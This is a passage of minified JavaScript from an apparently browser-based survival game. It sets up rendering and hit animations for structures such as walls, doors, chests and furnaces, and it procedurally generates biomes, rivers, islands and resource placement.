            angle: 0
          };
          break;
        case us.PLOT:
        case us.WORKBENCH:
        case us.WOOD_TOWER:
        case us.WELL:
        case us.TOTEM:
          this.draw = sa;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          break;
        case us.BRIDGE:
          this.draw = sa;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw_life = ta;
          break;
        case us.WALL:
        case us.STONE_WALL:
        case us.GOLD_WALL:
        case us.DIAMOND_WALL:
        case us.AMETHYST_WALL:
        case us.REIDITE_WALL:
        case us.SPIKE:
        case us.STONE_SPIKE:
        case us.GOLD_SPIKE:
        case us.DIAMOND_SPIKE:
        case us.AMETHYST_SPIKE:
        case us.REIDITE_SPIKE:
          this.draw = sa;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw_life = ra;
          break;
        case us.BED:
          this.draw = oa;
          this.opacity = 1;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          var h = this.angle % (Math.PI / 2);
          if (h < Math.PI / 4) {
            this.angle -= h;
          } else {
            this.angle += Math.PI / 2 - h;
          }
          break;
        case us.WHEAT_MOB:
          this.draw = ia;
          this.angle = Math.random() * Math.PI * 2;
          break;
        case us.ALOE_VERA_MOB:
          this.draw = ea;
          this.angle = Math.random() * Math.PI * 2;
          break;
        case us.PUMPKIN_MOB:
          this.draw = $n;
          this.angle = Math.random() * Math.PI * 2;
          break;
        case us.GARLIC_MOB:
          this.draw = Qn;
          this.angle = Math.random() * Math.PI * 2;
          break;
        case us.THORNBUSH_MOB:
          this.draw = Zn;
          this.angle = Math.random() * Math.PI * 2;
          break;
        case us.CHEST:
          this.update = function (e) {
            this.lock = this.info & 8192 ? 1 : 0;
            this.info = this.info & 8191;
            this.action = e;
          };
          this.draw = jn;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.lock = 0;
          this.update(this.action);
          break;
        case us.WOOD_DOOR_SPIKE:
        case us.STONE_DOOR_SPIKE:
        case us.GOLD_DOOR_SPIKE:
        case us.DIAMOND_DOOR_SPIKE:
        case us.AMETHYST_DOOR_SPIKE:
        case us.REIDITE_DOOR_SPIKE:
        case us.WOOD_DOOR:
        case us.STONE_DOOR:
        case us.GOLD_DOOR:
        case us.DIAMOND_DOOR:
        case us.AMETHYST_DOOR:
        case us.REIDITE_DOOR:
          this.draw = qn;
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.draw_life = ra;
          break;
        case us.FURNACE:
          this.draw_bg = Ua;
          this.draw = Ka;
          this.draw_fg = no;
          this.ground = new Utils.LinearAnimation(false, 1, 1.23, 1.18, 0.02, 0.02);
          this.halo = new Utils.LinearAnimation(false, 1, 1.23, 1.18, 0.04, 0.04);
          this.hit = {
            anim: new Utils.LinearAnimation(false, 1, 1, 0, 10, 10),
            update: false,
            angle: 0
          };
          this.update = function (e) {
            this.action = e;
          };
      }
    }
    function Rs(e) {
      function i(e, i, t, r, n) {
        for (var a = i + Math.floor(s_.RNG.get() * r), o = t + Math.floor(s_.RNG.get() * r), s = 10 + Math.floor(s_.RNG.get() * (s_.nw - a - 20)), _ = 10 + Math.floor(s_.RNG.get() * (s_.nh - o - 20)), E = s + a, T = _ + o, A = 0; A < s_.biomes.length; A++) {
          var d = s_.biomes[A];
          if (Utils.intersect_aabb(s, E, _, T, d.x1 / 100 - n, d.x2 / 100 + n, d.y1 / 100 - n, d.y2 / 100 + n) === 1) {
            return 0;
          }
        }
        s_.biomes.push(new s_.Biome(e, s, _, a, o, 15));
        return 1;
      }
      function t(e, i, t) {
        for (var r = i, n = t; n < s_.nh; n++) {
          for (var a = i; a < s_.nw && (n === t && (r = Math.max(a, r)), !(a > r)) && e[n][a] !== 1; a++) {
            e[n][a] = 1;
          }
          if (a < r) {
            break;
          }
        }
        s_.biomes.push(new s_.Biome(s_.BIOME_SEA, i, t, r - i + 1, n - t, 15));
      }
      function r(e, t, r, n, a) {
        for (var o = 0; o < a && i(e, t, r, n, 8) !== 1; o++);
        if (o === a) {
          return 0;
        } else {
          return 1;
        }
      }
      function n(e, i, t, r, n, a, o, s) {
        for (var _ = Math.floor(o / 2), E = Math.max(1, Math.floor(o / 2)), T = Math.floor(s / 2), A = Math.max(1, Math.floor(s / 2)), d = 0; d < t; d++) {
          for (var h = e - T; h < e + A; h++) {
            for (var I = i - _; I < i + E; I++) {
              if (g(h, I, "wtb", 0, 1) === 1) {
                a.push([h, I, 1]);
              }
            }
          }
          e += r;
          i += n;
        }
      }
      function a(e, i) {
        for (var t = s_.biomes[e], r = Math.floor(t.y1 / 100), a = Math.floor(t.x1 / 100), o = Math.floor(t.h / 100), s = a + (u = Math.floor(t.w / 100)), _ = 2, E = o, T = r, A = a + 10 + Math.floor((u - 20) * s_.RNG.get()), d = A - 4; d < A + 4; d++) {
          g(r - 1, d, "wtb", 0, 1);
        }
        for (; E > 0;) {
          if (_ !== 2) {
            if (E < 10) {
              for (O = 1; E > 0; O++) {
                n(T, A, 1, 1, 0, i, O, 1);
                E -= 1;
                T += 1;
              }
            } else if (_ !== 1) {
              _ = 1;
              var h = Math.floor(1 + s_.RNG.get() * 2);
              var I = 1 + Math.floor(s_.RNG.get() * 4);
              if (A < a + 16) {
                n(T, A, h, 0, 1, i, I, I);
                A += h;
              } else if (A > s - 16) {
                n(T, A, h, 0, -1, i, I, I);
                A -= h;
              } else if (s_.RNG.get() > 0.5) {
                n(T, A, h, 0, 1, i, I, I);
                A += h;
              } else {
                n(T, A, h, 0, -1, i, I, I);
                A -= h;
              }
            } else {
              var u;
              var l = Math.min(E, Math.floor(1 + s_.RNG.get() * 4));
              n(T, A, l, 1, 0, i, u = 1 + Math.floor(s_.RNG.get() * 4), u);
              _ = 0;
              E -= l;
              T += l;
            }
          } else {
            for (var O = 10; O > 1; O--) {
              n(T, A, 1, 1, 0, i, O, 1);
              E -= 1;
              T += 1;
            }
            _ = 0;
          }
        }
        for (d = A - 1; d < A + 2; d++) {
          g(T, d, "wtb", 0, 1);
        }
      }
      function o(e, i) {
        for (var t = 0; t < i.length; t++) {
          R(i[t][0], i[t][1], e, i[t][2]);
        }
      }
      function _(e) {
        for (var i = 0; i < 3; i++) {
          O(e, "s", i, 15);
        }
        for (i = 0; i < 3; i++) {
          O(e, "a", i, 1);
        }
        for (i = 0; i < 3; i++) {
          O(e, "d", i, 1);
        }
        u(e);
      }
      function T(e, i) {
        for (var t = 0; t < 3; t++) {
          O(e, "s", t, Math.floor(i * 18));
        }
        for (t = 0; t < 3; t++) {
          O(e, "f", t, Math.floor(i * 24));
        }
        for (t = 0; t < 3; t++) {
          O(e, "d", t, Math.max(1, Math.floor(i * 2)), 0.3);
        }
        for (t = 0; t < 3; t++) {
          O(e, "g", t, Math.floor(i * 6));
        }
        u(e);
      }
      function A(e, i) {
        for (var t = 0; t < 3; t++) {
          O(e, "s", t, Math.floor(i * 12));
        }
        for (t = 0; t < 3; t++) {
          O(e, "m", t, Math.max(1, Math.floor(i * 1)), 0.2);
        }
        O(e, "c", 0, Math.floor(i * 36));
        var r = [];
        !function (e, i) {
          for (var t = s_.biomes[e], r = Math.floor(t.y1 / 100), n = Math.floor(t.x1 / 100), a = Math.floor(t.h / 100), o = Math.floor(t.w / 100), s = r + Math.floor(a / 2), _ = n + Math.floor(o / 2), E = 0; E < 3; E++) {
            g(T = Math.floor(s - 3 + s_.RNG.get() * 6), A = Math.floor(_ - 3 + s_.RNG.get() * 6), "plm", E, 1);
          }
          for (E = 0; E < 80; E++) {
            var T;
            var A;
            if (g(T = Math.floor(s - 3 + s_.RNG.get() * 6), A = Math.floor(_ - 3 + s_.RNG.get() * 6), "wtb", 0, 1) === 1) {
              i.push([T, A, 0]);
            }
          }
        }(e, r);
        o(e, r);
        r = [];
      }
      function d(e, i) {
        !function (e, i) {
          for (var t = s_.biomes[i], r = 0, n = 0; r < e && n < 10000; n++) {
            var a = t.y1 + s_.RNG.get() * t.h;
            var o = t.x1 + s_.RNG.get() * t.w;
            var s = Math.floor(a / 100);
            var _ = Math.floor(o / 100);
            if (!(s_.dist_from_biome(i, _ * 100 + 50, s * 100 + 50) < 600)) {
              for (var E = 1, T = s - 4; E === 1 && T <= s + 4; T++) {
                for (var A = _ - 4; E === 1 && A <= _ + 4; A++) {
                  if (a_.tiles[T][A] !== undefined) {
                    E = 0;
                  }
                }
              }
              if (E !== 0) {
                g(s, _, "la", r % 6, 0);
                r++;
              }
            }
          }
        }(i * 80, e);
        for (var t = 0; t < 3; t++) {
          O(e, "s", t, Math.floor(i * 12));
        }
        for (t = 0; t < 3; t++) {
          O(e, "g", t, Math.floor(i * 6));
        }
        for (t = 0; t < 3; t++) {
          O(e, "re", t, Math.max(1, Math.floor(i * 1)), 0.2);
        }
        for (t = 0; t < 3; t++) {
          O(e, "a", t, Math.max(1, Math.floor(i * 2)));
        }
        u(e);
      }
      function h(e, i) {
        for (var t = 0; t < 6; t++) {
          O(e, "t", t, Math.floor(i * 80));
        }
        for (t = 0; t < 4; t++) {
          O(e, "b", t, Math.floor(i * 80));
        }
        for (t = 0; t < 3; t++) {
          O(e, "s", t, Math.floor(i * 50));
        }
        var r = [];
        for (t = 0; t < 6; t++) {
          a(e, r);
        }
        o(e, r);
        r = [];
        O(e, "p", 0, Math.floor(i * 28));
        for (t = 0; t < 3; t++) {
          O(e, "g", t, Math.floor(i * 7));
        }
        for (t = 0; t < 3; t++) {
          O(e, "d", t, Math.floor(i * 2));
        }
        for (t = 0; t < 3; t++) {
          O(e, "a", t, Math.floor(i * 1));
        }
        for (t = 0; t < 3; t++) {
          O(e, "m", t, Math.floor(i * 1));
        }
        O(e, "a", 0, Math.floor(i * 1));
        u(e);
      }
      function I(e, i) {
        for (var t = 0; t < 6; t++) {
          O(e, "t", t, Math.floor(i * 20));
        }
        for (t = 0; t < 4; t++) {
          O(e, "b", t, Math.floor(i * 20));
        }
        for (t = 0; t < 3; t++) {
          O(e, "s", t, Math.floor(i * 20));
        }
        var r = [];
        a(e, r);
        o(e, r);
        r = [];
        O(e, "p", 0, Math.floor(i * 24));
        for (t = 0; t < 3; t++) {
          O(e, "g", t, Math.floor(i * 5));
        }
        if (s_.mode === ds.MODE_ZOMBIES) {
          for (t = 0; t < 3; t++) {
            O(e, "d", t, Math.floor(i * 3));
          }
          for (t = 0; t < 3; t++) {
            O(e, "a", t, Math.floor(i * 2));
          }
        }
        u(e);
      }
      function u(e) {
        var i = s_.biomes[e];
        g(-3 + Math.floor(i.y2 / 100), -1 + Math.floor(i.x2 / 100), "s", 0, 0);
        g(3 + Math.floor(i.y1 / 100), -1 + Math.floor(i.x2 / 100), "s", 0, 0);
        g(-3 + Math.floor(i.y2 / 100), 1 + Math.floor(i.x1 / 100), "s", 0, 0);
        g(3 + Math.floor(i.y1 / 100), 1 + Math.floor(i.x1 / 100), "s", 0, 0);
      }
      function O(e, i, t, r, n) {
        var a = s_.biomes[e];
        var o = Math.floor(a.x1 / 100);
        var s = Math.floor(a.y1 / 100);
        var _ = Math.floor(a.w / 100);
        var E = Math.floor(a.h / 100);
        if (n !== undefined) {
          n = 1 - n;
          o += Math.floor(_ * n / 2);
          s += Math.floor(E * n / 2);
          _ -= Math.floor(_ * n);
          E -= Math.floor(E * n);
        }
        for (var T = a_.tiles, A = 0, d = 0; A < r && !(d > 50000); d++) {
          var h;
          var I = s + Math.floor(s_.RNG.get() * E);
          var u = o + Math.floor(s_.RNG.get() * _);
          if (!(s_.dist_from_biome(e, u * 100 + 50, I * 100 + 50) < 400 || (h = T[I][u + 1]) !== undefined && h[i] !== undefined && h[i][t] !== undefined || (h = T[I][u - 1]) !== undefined && h[i] !== undefined && h[i][t] !== undefined || (h = T[I + 1][u]) !== undefined && h[i] !== undefined && h[i][t] !== undefined || (h = T[I - 1][u]) !== undefined && h[i] !== undefined && h[i][t] !== undefined || (h = T[I + 1][u - 1]) !== undefined && h[i] !== undefined && h[i][t] !== undefined || (h = T[I - 1][u + 1]) !== undefined && h[i] !== undefined && h[i][t] !== undefined || (h = T[I + 1][u + 1]) !== undefined && h[i] !== undefined && h[i][t] !== undefined || (h = T[I - 1][u - 1]) !== undefined && h[i] !== undefined && h[i][t] !== undefined)) {
            if (T[I][u] === undefined) {
              g(I, u, i, t, 1);
              A++;
            }
          }
        }
      }
      function c(e, i) {
        return e >= 0 && i >= 0 && e < s_.nh && i < s_.nw;
      }
      function R(e, i, t, r) {
        if (c(e, i) && (tiles = a_.tiles, tiles[e][i] === undefined && (tiles[e][i] = {}), tiles[e][i].r === undefined)) {
          var n = 0;
          if (c(e - 1, i) && tiles[e - 1][i] !== undefined && tiles[e - 1][i].wtb !== undefined) {
            n += 2;
          }
          if (c(e, i - 1) && tiles[e][i - 1] !== undefined && tiles[e][i - 1].wtb !== undefined) {
            n += 8;
          }
          if (c(e, i + 1) && tiles[e][i + 1] !== undefined && tiles[e][i + 1].wtb !== undefined) {
            n += 16;
          }
          if (c(e + 1, i) && tiles[e + 1][i] !== undefined && tiles[e + 1][i].wtb !== undefined) {
            n += 64;
          }
          if (c(e - 1, i - 1) && (n & 10) == 10 && tiles[e - 1][i - 1] !== undefined && tiles[e - 1][i - 1].wtb !== undefined) {
            n += 1;
          }
          if (c(e - 1, i + 1) && (n & 18) == 18 && tiles[e - 1][i + 1] !== undefined && tiles[e - 1][i + 1].wtb !== undefined) {
            n += 4;
          }
          if (c(e + 1, i - 1) && (n & 72) == 72 && tiles[e + 1][i - 1] !== undefined && tiles[e + 1][i - 1].wtb !== undefined) {
            n += 32;
          }
          if (c(e + 1, i + 1) && (n & 80) == 80 && tiles[e + 1][i + 1] !== undefined && tiles[e + 1][i + 1].wtb !== undefined) {
            n += 128;
          }
          tiles[e][i].r = {};
          tiles[e][i].r.river = n;
          tiles[e][i].r.current = r;
          tiles[e][i].r.dist = s_.dist_from_biome(t, i * 100 + 50, e * 100 + 50) - 400;
          tiles[e][i].r.x = i * 100 + 50;
          tiles[e][i].r.y = e * 100 + 50;
        }
      }
      function g(e, i, t, r, n) {
        if (!(e < 0 || i < 0 || e >= s_.nh || i >= s_.nw)) {
          tiles = a_.tiles;
          if (tiles[e][i] === undefined) {
            tiles[e][i] = {};
          }
          if (tiles[e][i][t] !== undefined) {
            return 0;
          } else {
            tiles[e][i][t] = [];
            tiles[e][i][t][r] = [{
              x: i * 100 + 50,
              y: e * 100 + 50
            }];
            if (n === 1) {
              (function (e, i, t, r) {
                fe.push([e, i, t, r]);
              })(t, r, e, i);
            }
            return 1;
          }
        }
      }
      function C(e, i, t) {
        if (e[i]) {
          for (E = 0; E < e[i].length; E++) {
            if (e[i][E]) {
              for (l = 0; l < e[i][E].length; l++) {
                e[i][E][l].hit = t;
                e[i][E][l].update = false;
                e[i][E][l].time = 0;
                e[i][E][l].angle = 0;
              }
            }
          }
        }
      }
      this.mode = ds.MODE_PVP;
      this.max_units = e;
      this.custom_map = 0;
      this.islands = 6;
      this.players = [];
      this.units = [];
      this.units[us.PLAYERS] = [];
      this.units[us.FRUIT] = [];
      this.units[us.RABBIT] = [];
      this.units[us.WOLF] = [];
      this.units[us.CRAB] = [];
      this.units[us.BOAR] = [];
      this.units[us.BABY_MAMMOTH] = [];
      this.units[us.CRAB_BOSS] = [];
      this.units[us.BABY_DRAGON] = [];
      this.units[us.BABY_LAVA] = [];
      this.units[us.HAWK] = [];
      this.units[us.PIRANHA] = [];
      this.units[us.KRAKEN] = [];
      this.units[us.FOX] = [];
      this.units[us.PENGUIN] = [];
      this.units[us.SPELL] = [];
      this.units[us.FIREFLY] = [];
      this.units[us.BEAR] = [];
      this.units[us.MAMMOTH] = [];
      this.units[us.DRAGON] = [];
      this.units[us.LAVA_DRAGON] = [];
      this.units[us.FLAME] = [];
      this.units[us.WHEAT_MOB] = [];
      this.units[us.ALOE_VERA_MOB] = [];
      this.units[us.PUMPKIN_MOB] = [];
      this.units[us.GARLIC_MOB] = [];
      this.units[us.THORNBUSH_MOB] = [];
      this.units[us.TREASURE_CHEST] = [];
      this.units[us.DEAD_BOX] = [];
      this.units[us.CRATE] = [];
      this.units[us.BREAD_OVEN] = [];
      this.units[us.SIGN] = [];
      this.units[us.SPIDER] = [];
      this.units[us.WORKBENCH] = [];
      this.units[us.FIRE] = [];
      this.units[us.BIG_FIRE] = [];
      this.units[us.SEED] = [];
      this.units[us.SPIKE] = [];
      this.units[us.STONE_SPIKE] = [];
      this.units[us.GOLD_SPIKE] = [];
      this.units[us.DIAMOND_SPIKE] = [];
      this.units[us.AMETHYST_SPIKE] = [];
      this.units[us.REIDITE_SPIKE] = [];
      this.units[us.WALL] = [];
      this.units[us.STONE_WALL] = [];
      this.units[us.GOLD_WALL] = [];
      this.units[us.DIAMOND_WALL] = [];
      this.units[us.AMETHYST_WALL] = [];
      this.units[us.REIDITE_WALL] = [];
      this.units[us.BED] = [];
      this.units[us.WOOD_DOOR] = [];
      this.units[us.STONE_DOOR] = [];
      this.units[us.GOLD_DOOR] = [];
      this.units[us.DIAMOND_DOOR] = [];
      this.units[us.AMETHYST_DOOR] = [];
      this.units[us.REIDITE_DOOR] = [];
      this.units[us.WOOD_DOOR_SPIKE] = [];
      this.units[us.STONE_DOOR_SPIKE] = [];
      this.units[us.GOLD_DOOR_SPIKE] = [];
      this.units[us.DIAMOND_DOOR_SPIKE] = [];
      this.units[us.AMETHYST_DOOR_SPIKE] = [];
      this.units[us.REIDITE_DOOR_SPIKE] = [];
      this.units[us.FURNACE] = [];
      this.units[us.TOTEM] = [];
      this.units[us.WOOD_TOWER] = [];
      this.units[us.CHEST] = [];
      this.units[us.RESURRECTION] = [];
      this.units[us.EMERALD_MACHINE] = [];
      this.units[us.BRIDGE] = [];
      this.units[us.ROOF] = [];
      this.units[us.PLOT] = [];
      this.units[us.WHEAT_SEED] = [];
      this.units[us.ALOE_VERA_SEED] = [];
      this.units[us.PUMPKIN_SEED] = [];
      this.units[us.TOMATO_SEED] = [];
      this.units[us.CARROT_SEED] = [];
      this.units[us.WATERMELON_SEED] = [];
      this.units[us.GARLIC_SEED] = [];
      this.units[us.THORNBUSH_SEED] = [];
      this.units[us.WINDMILL] = [];
      this.units[us.EXTRACTOR_MACHINE_STONE] = [];
      this.units[us.EXTRACTOR_MACHINE_GOLD] = [];
      this.units[us.EXTRACTOR_MACHINE_DIAMOND] = [];
      this.units[us.EXTRACTOR_MACHINE_AMETHYST] = [];
      this.units[us.EXTRACTOR_MACHINE_REIDITE] = [];
      this.units[us.WELL] = [];
      this.units[us.GIFT] = [];
      this.units[us.GARLAND] = [];
      this.fast_units = [];
      this.nw = 260;
      this.nh = 260;
      this.dw = 100;
      this.dh = 100;
      this.w = this.nw * this.dw;
      this.h = this.nh * this.dh;
      this.RNG = new s.Random();
      this.biomes = [];
      this.shade = new Utils.LinearAnimation(false, 0, 1, 0, 1, 1);
      this.transition = false;
      this.BIOME = [];
      this.BIOME_FOREST = 0;
      this.BIOME_WINTER = 1;
      this.BIOME_LAVA = 2;
      this.BIOME_DRAGON = 3;
      this.BIOME_SEA = 4;
      this.BIOME_DESERT = 10;
      this.BIOME[this.BIOME_FOREST] = {
        isSand: 1,
        day: [19, 58, 43],
        night: [4, 43, 48],
        _color: ["#133a2b", "#042b30"]
      };
      this.BIOME[this.BIOME_SEA] = {
        isSand: 0,
        day: [11, 106, 132],
        night: [9, 55, 63],
        _color: ["#0B6A84", "#09373F"]
      };
      this.BIOME[this.BIOME_WINTER] = {
        isSand: 0,
        day: [235, 242, 240],
        night: [19, 97, 103],
        _color: ["#EBF2F0", "#136167"]
      };
      this.BIOME[this.BIOME_LAVA] = {
        isSand: 0,
        day: [45, 32, 23],
        night: [3, 28, 30],
        _color: ["#2D2017", "#031C1E"]
      };
      this.BIOME[this.BIOME_DRAGON] = {
        isSand: 0,
        day: [74, 74, 74],
        night: [24, 61, 60],
        _color: ["#4A4A4A", "#183D3C"]
      };
      this.BIOME[this.BIOME_DESERT] = {
        isSand: 0,
        day: [235, 216, 166],
        night: [9, 61, 56],
        _color: ["#EBD8A6", "#093D38"]
      };
      this.Biome = function (e, i, t, r, n, a) {
        this.x1 = i * 100;
        this.y1 = t * 100;
        this.w = r * 100;
        this.h = n * 100;
        this.x2 = (i + r) * 100;
        this.y2 = (t + n) * 100;
        this.t = e;
        this.v = a === undefined ? 15 : a;
      };
      this.MAX_DIST = -1000000;
      this.dist_winter = this.MAX_DIST;
      this.dist_desert = this.MAX_DIST;
      this.dist_lava = this.MAX_DIST;
      this.dist_forest = this.MAX_DIST;
      this.dist_water = this.MAX_DIST;
      this.dist_dragon = this.MAX_DIST;
      this.dist_from_biomes = function (e) {
        var i = e.r.x;
        var t = e.r.y;
        var r = Math.floor(t / 100);
        var n = Math.floor(i / 100);
        e.dist_winter = s_.MAX_DIST;
        e.dist_desert = s_.MAX_DIST;
        e.dist_lava = s_.MAX_DIST;
        e.dist_forest = s_.MAX_DIST;
        e.dist_dragon = s_.MAX_DIST;
        e.dist_sand = s_.MAX_DIST;
        for (var a = 0; s_.biomes[a].t !== s_.BIOME_SEA; a++) {
          if (s_.biomes[a].t === s_.BIOME_FOREST) {
            var o = s_.dist_from_biome(a, i, t);
            e.dist_forest = Math.max(e.dist_forest, o);
            if (o > 0 && s_.dist_from_sand(a, i, t) === 1) {
              e.dist_sand = 1;
            }
          } else if (s_.biomes[a].t === s_.BIOME_WINTER) {
            e.dist_winter = Math.max(e.dist_winter, s_.dist_from_biome(a, i, t));
          } else if (s_.biomes[a].t === s_.BIOME_DESERT) {
            e.dist_desert = Math.max(e.dist_desert, s_.dist_from_biome(a, i, t));
          } else if (s_.biomes[a].t === s_.BIOME_LAVA) {
            e.dist_lava = Math.max(e.dist_lava, s_.dist_from_biome(a, i, t));
          } else if (s_.biomes[a].t === s_.BIOME_DRAGON) {
            e.dist_dragon = Math.max(e.dist_dragon, s_.dist_from_biome(a, i, t));
          }
        }
        if (a_.tiles[r][n].iblk) {
          e.dist_sand = 1;
        }
        if (s_.find_bridge(n, r)) {
          e.dist_water = e.MAX_DIST;
        } else if (a_.tiles[r][n].wtb || e.dist_winter < 0 && e.dist_lava < 0 && e.dist_forest < 0 && e.dist_sand < 0 && e.dist_dragon < 0 && e.dist_desert < 0) {
          e.dist_water = 1;
        } else {
          e.dist_water = e.MAX_DIST;
        }
      };
      this.update_dist_from_biomes = function (e, i) {
        s_.dist_winter = s_.MAX_DIST;
        s_.dist_desert = s_.MAX_DIST;
        s_.dist_lava = s_.MAX_DIST;
        s_.dist_dragon = s_.MAX_DIST;
        s_.dist_forest = s_.MAX_DIST;
        for (var t = 0; s_.biomes[t].t !== s_.BIOME_SEA; t++) {
          if (s_.biomes[t].t === s_.BIOME_FOREST) {
            s_.dist_forest = Math.max(s_.dist_forest, s_.dist_from_biome(t, e, i));
          } else if (s_.biomes[t].t === s_.BIOME_WINTER) {
            s_.dist_winter = Math.max(s_.dist_winter, s_.dist_from_biome(t, e, i));
          } else if (s_.biomes[t].t === s_.BIOME_DESERT) {
            s_.dist_desert = Math.max(s_.dist_desert, s_.dist_from_biome(t, e, i));
          } else if (s_.biomes[t].t === s_.BIOME_LAVA) {
            s_.dist_lava = Math.max(s_.dist_lava, s_.dist_from_biome(t, e, i));
          } else if (s_.biomes[t].t === s_.BIOME_DRAGON) {
            s_.dist_dragon = Math.max(s_.dist_dragon, s_.dist_from_biome(t, e, i));
          }
        }
        if (s_.dist_winter < 0 && s_.dist_dragon < 0 && s_.dist_forest < 0 && s_.dist_dragon < 0 && s_.dist_desert < 0) {
          s_.dist_water = 1;
        } else {
          s_.dist_water = s_.MAX_DIST;
        }
      };
      this.dist_from_sand = function (e, i, t) {
        var r = s_.biomes[e];
        var n = 0;
        x1 = r.x1 + 30 + ((r.v & ds.LEFT) == 0 ? 150 : 0);
        var a = i - x1;
        if ((r.v & ds.LEFT) > 0 && a > 0 && a < 320) {
          n = 1;
        }
        y1 = r.y1 + 250 + ((r.v & ds.TOP) == 0 ? 150 : 0);
        a = t - y1;
        if ((r.v & ds.TOP) > 0 && a > 0 && a < 320) {
          n = 1;
        }
        x2 = r.x2 + 80 + ((r.v & ds.RIGHT) == 0 ? -200 : 0);
        a = x2 - i;
        if ((r.v & ds.RIGHT) > 0 && a > 0 && a < 320) {
          n = 1;
        }
        y2 = r.y2 - 200 + ((r.v & ds.BOTTOM) == 0 ? -200 : 0);
        a = y2 - t;
        if ((r.v & ds.BOTTOM) > 0 && a > 0 && a < 320) {
          n = 1;
        }
        if (i >= x1 && i <= x2 && t >= y1 && t <= y2) {
          return n;
        } else {
          return 0;
        }
      };
      this.dist_from_biome = function (e, i, t) {
        var r = s_.biomes[e];
        x1 = r.x1 + 30;
        y1 = r.y1 + 250;
        x2 = r.x2 + 80;
        y2 = r.y2 - 200;
        if (i >= x1 && i <= x2 && t >= y1 && t <= y2) {
          return Math.min(i - x1, x2 - i, t - y1, y2 - t);
        }
        var n = -1000000;
        if (i - x1 < 0) {
          n = Math.max(n, i - x1);
        } else if (x2 - i < 0) {
          n = Math.max(n, x2 - i);
        }
        distY = -1000000;
        if (t < y1 || t > y2) {
          if (t - y1 < 0) {
            distY = Math.max(distY, t - y1);
          } else {
            distY = Math.max(distY, y2 - t);
          }
          n = n !== -1000000 && distY !== -1000000 ? Math.min(n, distY) : distY;
        }
        return n;
      };
      this.add_island = function (e, i, t) {
        var r = t;
        var n = i;
        g(r, n, "isl", e, 1);
        for (var a = 0; a < 4; a++) {
          for (var o = 0; o < 3; o++) {
            g(r - o, n - a, "iblk", 0);
            g(r + o, n - a, "iblk", 0);
            g(r + o, n + a, "iblk", 0);
            g(r - o, n + a, "iblk", 0);
          }
        }
        if (e === 0) {
          for (a = 0; a < 2; a++) {
            g(r - a, n - 4, "iblk", 0);
            g(r + a, n - 4, "iblk", 0);
            g(r - a, n + 4, "iblk", 0);
            g(r + a, n + 4, "iblk", 0);
          }
          for (a = 0; a < 3; a++) {
            g(r - 3, n + a, "iblk", 0);
            g(r + 3, n + a, "iblk", 0);
            g(r - 3, n - a, "iblk", 0);
            g(r + 3, n - a, "iblk", 0);
          }
          g(r - 2, n - 4, "iblk", 0);
          g(r - 3, n - 3, "iblk", 0);
          g(r + 2, n + 4, "iblk", 0);
          g(r + 3, n + 3, "iblk", 0);
        } else if (e === 1) {
          for (a = 0; a < 3; a++) {
            g(r - a, n - 4, "iblk", 0);
            g(r + a, n - 4, "iblk", 0);
            g(r - a, n + 4, "iblk", 0);
            g(r + a, n + 4, "iblk", 0);
          }
          for (a = 0; a < 4; a++) {
            g(r - 3, n + a, "iblk", 0);
            g(r + 3, n + a, "iblk", 0);
            g(r - 3, n - a, "iblk", 0);
            g(r + 3, n - a, "iblk", 0);
          }
        } else if (e === 2) {
          for (a = 0; a < 2; a++) {
            g(r - a, n - 4, "iblk", 0);
            g(r + a, n - 4, "iblk", 0);
            g(r - a, n + 4, "iblk", 0);
            g(r + a, n + 4, "iblk", 0);
          }
          for (a = 0; a < 3; a++) {
            g(r - 3, n + a, "iblk", 0);
            g(r + 3, n + a, "iblk", 0);
            g(r - 3, n - a, "iblk", 0);
            g(r + 3, n - a, "iblk", 0);
          }
        }
      };
      this.add_islands = function (e) {
        for (var i = 0; i < s_.biomes.length && e > 0; i++) {
          var t = s_.biomes[i];
          if (t.t === s_.BIOME_SEA && t.w > 1800 && t.h > 1000) {
            var r = Math.floor((t.x1 + t.w / 2) / 100);
            var n = Math.floor((t.y1 + t.h / 2) / 100);
            s_.add_island(e % 3, r, n);
            for (var a = 0; a < 3; a++) {
              var o = n - 2 + Math.floor(s_.RNG.get() * 4);
              var s = r - 3 + Math.floor(s_.RNG.get() * 6);
              if (a_.tiles[o][s].s === undefined) {
                g(o, s, "plm", a);
              }
              o = n - 2 + Math.floor(s_.RNG.get() * 4);
              s = r - 3 + Math.floor(s_.RNG.get() * 6);
              if (a_.tiles[o][s].plm === undefined) {
                g(o, s, "s", a);
              }
            }
            o = n - 2 + Math.floor(s_.RNG.get() * 4);
            s = r - 3 + Math.floor(s_.RNG.get() * 6);
            if (a_.tiles[o][s].plm === undefined && a_.tiles[o][s].s === undefined) {
              g(o, s, "p", 0, 1);
            }
            e--;
          }
        }
      };
      this.generate_world = function (e) {
        s_.RNG.init(e);
        for (var i = 0;;) {
          if (++i > 10000) {
            return;
          }
          s_.biomes = [];
          if (!(s_.custom_map !== 0 || s_.mode !== ds.MODE_VAMPIRES && s_.mode !== ds.MODE_EXPERIMENTAL && s_.mode !== ds.MODE_PVP)) {
            s_.custom_map = de;
          }
          if (s_.mode === ds.MODE_ZOMBIES) {
            s_.biomes.push(new s_.Biome(s_.BIOME_FOREST, 2, 2, 80, 80, 15));
          } else if (s_.mode === ds.MODE_LEGACY) {
            s_.biomes.push(new s_.Biome(s_.BIOME_FOREST, 2, 2, 150, 150, 15));
          } else if (s_.custom_map !== 0 && s_.custom_map.length > 0 && s_.custom_map[0].length > 3) {
            for (var n = 0; n < s_.custom_map.length; n++) {
              if ((b = s_.custom_map[n])[0] !== 0) {
                break;
              }
              var a = ds.BIOME_FOREST;
              switch (b[1]) {
                case "FOREST":
                  a = s_.BIOME_FOREST;
                  break;
                case "WINTER":
                  a = s_.BIOME_WINTER;
                  break;
                case "DESERT":
                  a = s_.BIOME_DESERT;
                  break;
                case "LAVA":
                  a = s_.BIOME_LAVA;
                  break;
                case "DRAGON":
                  a = s_.BIOME_DRAGON;
              }
